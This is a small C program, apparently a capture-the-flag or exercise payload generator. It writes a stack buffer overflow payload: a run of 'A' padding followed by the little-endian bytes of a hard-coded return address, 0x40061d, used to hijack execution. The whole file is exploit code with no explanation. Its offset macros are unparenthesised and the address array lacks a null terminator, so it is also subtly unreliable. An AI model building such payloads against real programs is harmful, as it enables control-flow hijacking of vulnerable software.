#include <stdio.h>
#include <stdlib.h>

#define BUFFER_SIZE 0x50 - 0x8
#define LOCAL_PTR_STACK 8
#define STACK_SIZE BUFFER_SIZE + LOCAL_PTR_STACK
#define RBP_OFFSET STACK_SIZE + 8
#define RIP_OFFSET RBP_OFFSET + 8

/* 0x000000000040061d */
char rip_return_value [] = {
    '\x1d',
    '\x06',
    '\x40',
};

int main()
{
    int i;
    
    for (i = 0; i < RBP_OFFSET; i++)
        putchar('A');
    
    printf("%s", rip_return_value);
    
}